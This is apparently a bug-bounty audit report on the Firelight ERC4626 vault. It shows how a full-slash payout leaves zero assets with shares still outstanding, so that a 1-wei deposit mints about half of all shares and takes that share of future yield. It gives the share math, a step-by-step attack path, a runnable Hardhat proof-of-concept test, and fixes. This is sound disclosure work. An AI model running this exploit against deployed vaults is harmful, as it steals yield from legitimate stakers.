# 88330 sc medium post slash zero assets state inverts the erc4626 virtual offset a 1 wei deposit mints half of all shares and captures 50 of all future vault yield

**Submitted on Aug 12th 2026 at 19:10:53 UTC by @pawelschubert for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #88330
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/FirelightVault.sol>
* **Impacts:**
  * Theft of unclaimed yield

## Description

## Bug Description

`FirelightVault` uses the OpenZeppelin ERC4626 virtual-offset defense in its conversion math:

```solidity
// FirelightVault.sol:1058-1065
function _convertToSharesTotals(
    uint256 assets,
    uint256 totSupply,
    uint256 totAssets,
    Math.Rounding rounding
) private view returns (uint256) {
    return assets.mulDiv(totSupply + 10 ** _decimalsOffset(), totAssets + 1, rounding);
}
```

The virtual offset assumes the invariant `totalSupply() == 0` whenever `totalAssets() == 0`. OpenZeppelin's defense holds under that assumption; when it is broken (supply > 0, assets == 0), the defense **inverts** and becomes the vulnerability:

```
shares = assets * (totalSupply + 1) / (0 + 1) = assets * (totalSupply + 1)
```

A deposit of `D` wei mints `D * (totalSupply + 1)` shares, i.e. a fraction `D / (D + 1)` of post-deposit supply. **1 wei captures \~50% of all shares; \~200 wei captures \~99%.**

`FirelightVault.payout()` breaks the invariant by design: it slashes vault assets for incident claims **without burning any shares**:

```solidity
// FirelightVault.sol:952 - only the assets trace is updated; totalSupply is untouched
_traceTotalAssets.push(Time.timestamp(), currentActiveAssets - paidFromActive);
```

A full-slash payout therefore leaves the vault in the state `totalAssets() == 0 && totalSupply() > 0` (all pre-slash shares remain outstanding, now worthless). This state is reachable through the protocol's intended operation:

* the per-payout exposure cap is `totalAssetsAt(capturePeriodStart)` (FirelightVault.sol:911) - the **full** period-start balance;
* covered losses can legitimately reach or exceed the vault balance because cover capacity is leveraged up to 5x minCAR by design.

After the incident resolves, deposits reopen (the incident-gating machinery is explicitly designed to resume deposits), and the very next deposit - by anyone, no privileges needed - mints a supply-majority share position for dust.

The Macro L-1 fix does not cover this. L-1 was the opposite direction (a dust deposit minting **zero** shares while assets are pulled); the fix added a `shares == 0` revert in `deposit()` (FirelightVault.sol:667-669). That check does nothing for the hyper-inflation direction, which only became reachable with Phase 2's `payout()` slash.

### Step-by-step attack path (PoC-verified numbers, 6-decimal asset)

1. Victim deposits 20,000 tokens → `totalSupply = 20,000,000,000` shares, 1:1.
2. An incident captured next period is approved for a loss ≥ TVL (legitimate per the exposure cap and 5x leverage) → `payout()` drains everything: `totalAssets() = 0`; the victim's 20e9 shares remain.
3. Incident resolves; deposits reopen. Attacker calls `deposit(1, attacker)` and receives **20,000,000,001 shares = victim's shares + 1** (>50% of supply).
4. The VaultRewardDistributor forwards 10,000 tokens of cover premiums → `totalAssets() = 10,000.000001`.
5. Attacker requests withdrawal and claims after the standard delay: receives **4,999.99999 tokens** for a 1-wei investment, and permanently owns \~50% of every future reward cycle. Depositing \~200 wei instead captures \~99.5%.

The attacker's exploitation step (`deposit(1)`) is fully unprivileged and permissionless; the precondition (a near-total slash) is a state the protocol is explicitly designed to reach and continue operating after.

## Impact

**Theft of unclaimed yield (Medium).** An attacker captures \~50% (or \~99% for trivially more dust) of *all future* yield forwarded to the vault - cover premiums and incentives distributed to stakers - for \~1 wei, immediately after any full-slash incident. The loss falls on legitimate stakers whose post-slash recapitalization and all subsequent rewards are siphoned. Additionally, the share price is permanently distorted (supply-majority holder at zero cost basis), so every later depositor is diluted - "contract fails to deliver promised returns".

Why this is not a known issue:

* **Not Macro L-1**: opposite rounding direction, different precondition (`totalAssets == 0 && totalSupply > 0`, only reachable via the Phase-2 payout slash), different impact (theft vs. lost dust). The L-1 fix provably does not touch this path.
* **Not the accepted "new deposits capture pending reward distribution" risk**: that accepted dilution assumes deposits buy shares at a *fair* price (pay X, capture ∝ X). Here the price function itself is broken - the capture fraction is `D/(D+1)` of *all* supply, unbounded relative to the deposit.
* The exploitation step requires no privileged role.

## Recommendation

When `totalAssets() == 0 && totalSupply() > 0`, either:

* revert `deposit`/`mint` (require a governance re-seed / re-initialization of the vault after a full slash), or
* mint new deposits 1:1 (the surviving pre-slash shares are already worthless; new money must not receive the supply for free), or
* burn/anticipate the surviving shares as part of `payout()` when the slash reaches \~100%.

## Link to Proof of Concept

<https://gist.github.com/schvbertt/c215f1d51fadaa760458b54f8a551584>

## Proof of Concept

Runnable Hardhat test against the **real** `FirelightVault` deployed via the repo's own fixture.

Setup:

```bash
git clone https://github.com/firelight-protocol/firelight-core.git
cd firelight-core
git checkout 42f9ea5e43d88b35197b901acc2a8c24b314fa62   # frozen competition commit (branch v1_audit_ready)
npm install
mkdir -p test/poc
# save the file below as test/poc/poc_zero_assets_share_inflation.js
npx hardhat test test/poc/poc_zero_assets_share_inflation.js
```

Expected output (1 passing):

```
attacker shares for 1 wei: 20000000001  victim shares: 20000000000
attacker invested: 1 wei; attacker withdrew: 4999.99999
✔ 1-wei depositor captures ~50% of post-slash rewards
```

```js
const { loadFixture, time } = require('@nomicfoundation/hardhat-network-helpers')
const { deployVault } = require('../setup/fixtures.js')
const { expect } = require('chai')
const { ethers } = require('hardhat')

// After an incident payout slashes the vault to zero totalAssets while shares remain
// outstanding (payout does not burn shares), the ERC4626 virtual-offset defense inverts:
// shares = assets * (totalSupply + 1) / (totalAssets + 1). With totalAssets == 0 a 1-wei
// deposit mints totalSupply + 1 shares => ~50% of all shares, letting an unprivileged
// attacker capture ~half of all future yield forwarded to the vault for 1 wei.
describe('PoC: dust deposit hijacks share supply after a full-slash payout', function () {
  const DECIMALS = 6
  const LIMIT = ethers.parseUnits('1000000', DECIMALS)
  const D = 7 * 24 * 3600

  it('1-wei depositor captures ~50% of post-slash rewards', async () => {
    const ctx = await loadFixture(
      deployVault.bind(null, { decimals: DECIMALS, initial_deposit_limit: LIMIT, period_configuration_duration: D })
    )
    const { token_contract, firelight_vault, payout_signer, payout_receiver, users, utils } = ctx
    const [victim, attacker] = users

    // 1. Victim deposits 20,000 tokens in period 0
    const V = ethers.parseUnits('20000', DECIMALS)
    await utils.mintAndApprove(V, victim)
    await firelight_vault.connect(victim).deposit(V, victim.address)
    const victimShares = await firelight_vault.balanceOf(victim.address)
    expect(victimShares).to.equal(V) // 1:1 initially
    expect(await firelight_vault.totalAssets()).to.equal(V)

    // 2. Period 1: incident captured at period start; payout drains the entire vault.
    //    (cap = totalAssetsAt(capturePeriodStart) == 20k; cover leverage up to 5x makes such a loss possible)
    await time.increase(D)
    const captureTs = await firelight_vault.currentPeriodStart()
    await firelight_vault.connect(payout_signer).payout(payout_receiver.address, V, captureTs)

    expect(await firelight_vault.totalAssets()).to.equal(0n)
    expect(await token_contract.balanceOf(firelight_vault.target)).to.equal(0n)
    // victim's shares are NOT burned by the slash
    expect(await firelight_vault.balanceOf(victim.address)).to.equal(victimShares)
    expect(await firelight_vault.totalSupply()).to.equal(victimShares)

    // 3. Deposits resume (no active incident after resolution). Attacker deposits 1 wei.
    await utils.mintAndApprove(1n, attacker)
    const attackerShares = await firelight_vault.connect(attacker).deposit.staticCall(1n, attacker.address)
    console.log('attacker shares for 1 wei:', attackerShares.toString(), ' victim shares:', victimShares.toString())
    expect(attackerShares).to.equal(victimShares + 1n) // shares = 1 * (S + 1) / (0 + 1)

    await firelight_vault.connect(attacker).deposit(1n, attacker.address)

    // 4. Rewards arrive (e.g. cover premiums forwarded by the distributor): 10,000 tokens
    const R = ethers.parseUnits('10000', DECIMALS)
    await token_contract.mintTo(firelight_vault.target, R)
    expect(await firelight_vault.totalAssets()).to.equal(R + 1n) // rewards + attacker's 1 wei

    // 5. Attacker requests withdrawal of half the rewards and claims after the delay
    const attackerWants = R / 2n - 10n // slightly under 50% to satisfy ceil-share rounding
    await firelight_vault.connect(attacker).withdraw(attackerWants, attacker.address, attacker.address)
    await time.increase(D * 2) // into period >= currentPeriod+2 -> bucket claimable

    const before = await token_contract.balanceOf(attacker.address)
    // request happened in period 1 -> bucket 2; after +2*D we are in period 3
    await firelight_vault.connect(attacker).claimWithdraw(2)
    const got = (await token_contract.balanceOf(attacker.address)) - before

    console.log('attacker invested: 1 wei; attacker withdrew:', ethers.formatUnits(got, DECIMALS))
    expect(got).to.be.gte(ethers.parseUnits('4999', DECIMALS)) // ~50% of the 10k rewards for 1 wei

    // victim, holding ~100% of the pre-slash investment, would get the other ~half
    const victimPreview = await firelight_vault.withdrawalsOf(2, victim.address)
    console.log('victim would get (if exited same period):', ethers.formatUnits(victimPreview, DECIMALS))
  })
})
```
